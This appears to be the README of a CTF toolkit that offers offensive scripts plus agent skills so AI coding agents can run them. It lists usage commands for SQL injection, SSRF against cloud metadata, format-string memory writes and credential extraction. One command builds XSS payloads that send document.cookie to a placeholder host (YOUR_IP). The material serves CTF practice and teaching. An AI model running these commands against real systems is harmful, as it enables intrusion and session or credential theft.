# /CTF Toolkit

A comprehensive collection of scripts, tools, and agent skills for solving CTF (Capture The Flag) challenges. Organized by category with a master installer for quick environment setup.

The toolkit ships with a complete set of agent skills that can be installed into any AI coding agent that supports the Claude Code skill format — including Claude Code CLI, desktop app, and compatible agent harnesses. Once installed, the agent knows exactly which script to run, which flags to pass, and how to interpret results for every challenge category.

## Agent Skills — Quick Install

```bash
git clone https://github.com/Dr-yato/ctf-toolkit ~/ctf-toolkit
bash ~/ctf-toolkit/install-skills.sh
```

After running the install script, 10 skills become available in your agent:

| Skill | Trigger when... |
|-------|----------------|
| `/ctf-toolkit` | Starting any CTF challenge — routes to the right category |
| `/ctf-toolkit-web` | HTTP app, SQLi, XSS, SSRF, JWT, SSTI, file upload |
| `/ctf-toolkit-pwn` | Binary exploitation, overflow, ROP, format string, heap |
| `/ctf-toolkit-crypto` | RSA, classical ciphers, XOR, AES, hash cracking |
| `/ctf-toolkit-forensics` | PCAP, disk image, memory dump, steganography |
| `/ctf-toolkit-networking` | Custom TCP/UDP service, protocol reversing |
| `/ctf-toolkit-ransomware` | Ransomware binary + encrypted files to recover |
| `/ctf-toolkit-vuln` | Fuzzing, source audit, crash triage, symbolic execution |
| `/ctf-toolkit-osint` | Domain, username, image metadata, social media recon |
| `/ctf-toolkit-rev` | Decompilation, GDB, Ghidra, binary patching |

Each skill tells the agent exactly which script to run with which arguments, includes decision maps, and links to deeper technique notes when needed.

### Adding Skills to Any Agent

The skills live in `skills/` and follow the standard Claude Code skill format. They work in:

- Claude Code CLI (`claude` command)
- Claude Code desktop app
- Claude Code VS Code / JetBrains extensions
- Any agent harness that loads skills from `~/.claude/skills/`

To install into a different skills directory, copy the folders manually:

```bash
cp -r ~/ctf-toolkit/skills/ctf-toolkit* /path/to/your/agent/skills/
```

Each skill is a single `SKILL.md` file with a frontmatter header (`name`, `description`, `allowed-tools`) and operational instructions the agent follows directly. No configuration beyond copying the files is required.

## Categories

| Directory | Purpose |
|-----------|---------|
| `web/` | SQL injection, XSS, SSRF testing |
| `pwn/` | Buffer overflow, format string, ROP chain exploitation |
| `crypto/` | RSA attacks, classical cipher analysis |
| `rev/` | Static analysis of binaries |
| `forensics/` | File analysis, PCAP analysis, memory forensics |
| `osint/` | Domain recon, subdomain discovery, username hunting |
| `networking/` | Port scanning, protocol probing, packet crafting |
| `ransomware-analysis/` | Ransomware reverse engineering and file recovery |
| `vuln-research/` | Fuzzing, crash triage, source code auditing |
| `common/` | Shared utility library (encoding, hashing, struct helpers) |

## Installation

Run the master installer to set up the full environment on Linux or macOS:

```bash
bash install.sh
```

The installer covers:

- System packages via `apt` (Debian/Ubuntu) or `brew` (macOS)
- Python tools: pwntools, pycryptodome, scapy, angr, z3-solver, yara, impacket, sqlmap, and more
- Go tools: ffuf, nuclei, subfinder, httpx, dalfox, gospider, waybackurls
- Ruby gems: one_gadget, zsteg
- Ghidra (Java-based decompiler)
- SecLists wordlist collection
- pwndbg GDB plugin
- Shell aliases for common operations

After install, reload your shell:

```bash
source ~/.bashrc   # or source ~/.zshrc
```

## Scripts

### Web

**`web/sqli_tester.py`** — SQL injection testing

```bash
# Detect injection points
python3 web/sqli_tester.py --url http://target.com/page --param id --mode detect

# UNION-based extraction
python3 web/sqli_tester.py --url http://target.com/page --param id --mode union --cols 3

# Boolean blind extraction
python3 web/sqli_tester.py --url http://target.com/page --param id --mode blind-bool --query "SELECT database()"

# Time-based blind
python3 web/sqli_tester.py --url http://target.com/page --param id --mode blind-time --db mysql

# Auth bypass
python3 web/sqli_tester.py --url http://target.com/login --param id --mode auth
```

**`web/xss_scanner.py`** — XSS detection and payload generation

```bash
# Scan for reflected XSS
python3 web/xss_scanner.py --url http://target.com/search --param q --mode scan

# Generate exfiltration payloads for admin bot challenges
python3 web/xss_scanner.py --mode exfil --exfil http://YOUR_IP:8888 --target document.cookie

# Print all payload sets
python3 web/xss_scanner.py --mode payloads
```

**`web/ssrf_tester.py`** — SSRF testing

```bash
# Full SSRF scan
python3 web/ssrf_tester.py --url http://target.com/fetch --param url --mode all

# Cloud metadata only
python3 web/ssrf_tester.py --url http://target.com/fetch --param url --mode metadata

# Internal port scan via SSRF
python3 web/ssrf_tester.py --url http://target.com/fetch --param url --mode portscan --host 127.0.0.1
```

### Pwn

**`pwn/pwn_template.py`** — Universal pwntools exploit template

Edit the `BINARY`, `LIBC`, and `exploit()` function, then:

```bash
# Local
python3 pwn/pwn_template.py

# Remote
python3 pwn/pwn_template.py --remote challenge.ctf.io 1337

# With GDB attached
python3 pwn/pwn_template.py --debug
```

**`pwn/bof_helper.py`** — Buffer overflow helper

```bash
# Generate cyclic pattern
python3 pwn/bof_helper.py --binary ./vuln --cyclic 512

# Find offset from crash value
python3 pwn/bof_helper.py --binary ./vuln --find-offset 0x61616164

# Check protections
python3 pwn/bof_helper.py --binary ./vuln --checksec

# Find ROP gadgets
python3 pwn/bof_helper.py --binary ./vuln --gadgets

# Build ret2libc skeleton
python3 pwn/bof_helper.py --binary ./vuln --ret2libc ./libc.so.6 --offset 72
```

**`pwn/fmt_string.py`** — Format string exploitation

```bash
# Find format string offset
python3 pwn/fmt_string.py --binary ./vuln --mode find-offset

# Dump stack values
python3 pwn/fmt_string.py --binary ./vuln --mode leak-stack --offset 6

# Read arbitrary address
python3 pwn/fmt_string.py --binary ./vuln --mode read-addr --offset 6 --addr 0x601234

# Write arbitrary value
python3 pwn/fmt_string.py --binary ./vuln --mode write-addr --offset 6 --addr 0x601234 --value 0xdeadbeef
```

### Crypto

**`crypto/rsa_attacks.py`** — RSA attack toolkit

```bash
# Factor modulus (Fermat, Pollard rho)
python3 crypto/rsa_attacks.py --mode factor --n 0xABCD... --e 65537 --c 0x1234...

# Small public exponent (e=3)
python3 crypto/rsa_attacks.py --mode small-e --n 0xABCD... --e 3 --c 0x1234...

# Wiener's small private exponent
python3 crypto/rsa_attacks.py --mode wiener --n 0xABCD... --e 0xLARGE...

# Common factor across multiple keys (GCD attack)
# Edit the script to pass multiple N values

# Decrypt with known d
python3 crypto/rsa_attacks.py --mode decrypt --n 0xABCD... --d 0x... --c 0x1234...
```

**`crypto/classical.py`** — Classical cipher solver

```bash
# Brute-force Caesar
python3 crypto/classical.py --mode caesar --text "Khoor Zruog"

# Break Vigenere (auto key length detection)
python3 crypto/classical.py --mode vigenere-break --text "CIPHERTEXT"

# Decode with known key
python3 crypto/classical.py --mode vigenere --text "CIPHER" --key "key" --decrypt

# Rail fence cipher
python3 crypto/classical.py --mode railfence --text "WEAREDISCOVEREDRUNATONCE" --rails 3 --decrypt

# Try all base decodings
python3 crypto/classical.py --mode bases --text "SGVsbG8gV29ybGQ="

# XOR single-byte brute force
python3 crypto/classical.py --mode xor-brute --text "1a2b3c4d..."
```

### Forensics

**`forensics/file_analysis.sh`** — Quick file triage

```bash
bash forensics/file_analysis.sh unknown_file
```

Checks: file type, magic bytes, strings, entropy, binwalk, exiftool, steghide, zsteg, flag patterns.

**`forensics/pcap_analysis.py`** — PCAP analysis

```bash
# Full analysis
python3 forensics/pcap_analysis.py --pcap capture.pcap --mode all

# Extract credentials only
python3 forensics/pcap_analysis.py --pcap capture.pcap --mode creds

# Carve files from traffic
python3 forensics/pcap_analysis.py --pcap capture.pcap --mode carve --out ./carved

# Reassemble TCP stream on specific port
python3 forensics/pcap_analysis.py --pcap capture.pcap --mode streams --port 80

# Search for flag patterns
python3 forensics/pcap_analysis.py --pcap capture.pcap --mode flags
```

**`forensics/memory_forensics.sh`** — Volatility 3 wrapper

```bash
bash forensics/memory_forensics.sh memory.img
```

Auto-detects Windows or Linux image, runs process list, network scan, credential extraction, and searches for flag patterns.

### Networking

**`networking/network_analysis.py`** — Network tools

```bash
# TCP port scan
python3 networking/network_analysis.py --host 10.0.0.1 --mode scan --ports 1-1024

# Banner grab
python3 networking/network_analysis.py --host 10.0.0.1 --port 22 --mode banner

# Interactive TCP session
python3 networking/network_analysis.py --host challenge.ctf.io --port 9999 --mode connect

# Probe unknown protocol
python3 networking/network_analysis.py --host 10.0.0.1 --port 9999 --mode probe

# ARP scan LAN (requires root/scapy)
python3 networking/network_analysis.py --mode arp --network 192.168.1.0/24
```

### Ransomware Analysis

**`ransomware-analysis/analyze_ransomware.py`** — Reverse and decrypt ransomware challenges

```bash
# Static analysis of binary
python3 ransomware-analysis/analyze_ransomware.py --mode analyze --binary ./ransomware

# Extract embedded key candidates
python3 ransomware-analysis/analyze_ransomware.py --mode extract-key --binary ./ransomware

# Check for CTF weaknesses (hardcoded key, time-seeded PRNG)
python3 ransomware-analysis/analyze_ransomware.py --mode check-weak --binary ./ransomware

# Decrypt files once key is recovered
python3 ransomware-analysis/analyze_ransomware.py \
  --mode recover \
  --encrypted ./encrypted_dir \
  --key aabbccddeeff00112233445566778899 \
  --cipher aes-cbc \
  --iv 00000000000000000000000000000000 \
  --out ./recovered
```

### Vulnerability Research

**`vuln-research/fuzzer.py`** — Fuzzing and crash triage

```bash
# Fuzz a binary via stdin
python3 vuln-research/fuzzer.py --mode binary --binary ./target --iters 5000

# Fuzz a network service
python3 vuln-research/fuzzer.py --mode network --host 127.0.0.1 --port 9999 --iters 1000

# Detect format string vulnerability
python3 vuln-research/fuzzer.py --mode detect-fmt --binary ./target

# Triage a crash with GDB backtrace
python3 vuln-research/fuzzer.py --mode triage --binary ./target --crash AABBCCDD...

# Show integer boundaries and string fuzzing inputs
python3 vuln-research/fuzzer.py --mode gen
```

### OSINT

**`osint/osint_recon.sh`** — Domain and username recon

```bash
bash osint/osint_recon.sh example.com
bash osint/osint_recon.sh username
```

Runs: WHOIS, DNS enumeration, zone transfer attempt, subdomain discovery (subfinder/amass), reverse IP, nmap, crt.sh certificate transparency, Wayback Machine, Sherlock username hunt, and generates Google dork suggestions.

### Common Utilities

**`common/ctf_utils.py`** — Import in any script

```python
from common.ctf_utils import *

b64d("SGVsbG8=")          # decode base64
decode_all("SGVsbG8=")    # try all decodings
p64(0xdeadbeef)            # pack little-endian 64-bit
u64(data[:8])              # unpack little-endian 64-bit
hexdump(data)              # formatted hex dump
extract_flags(text)        # find CTF{...} patterns
modinv(3, 11)              # modular inverse
```

## Agent Skills

Four new Claude Code skills were added alongside this toolkit:

| Skill | Invoke with |
|-------|-------------|
| Networking challenges | `/ctf-networking` |
| Ransomware analysis challenges | `/ctf-ransomware` |
| Vulnerability research / 0-day finding | `/ctf-vuln-research` |
| 0-click / admin-bot / client-side attacks | `/ctf-0clicks` |

These complement the existing skills: `/ctf-web`, `/ctf-pwn`, `/ctf-crypto`, `/ctf-reverse`, `/ctf-forensics`, `/ctf-osint`, `/ctf-malware`, `/ctf-misc`, `/ctf-ai-ml`.

## Requirements

Python 3.8+ with the following packages (installed by `install.sh`):

```
pwntools pycryptodome requests scapy impacket
angr z3-solver yara-python ropper ROPgadget
sqlmap flask flask-unsign paramiko pillow sympy gmpy2
```

Go 1.20+ for the web recon tools.

Java 11+ for Ghidra.

## Legal Notice

This toolkit is intended for use in authorized CTF competitions, security research on systems you own, and educational purposes. Do not use against systems without explicit permission.
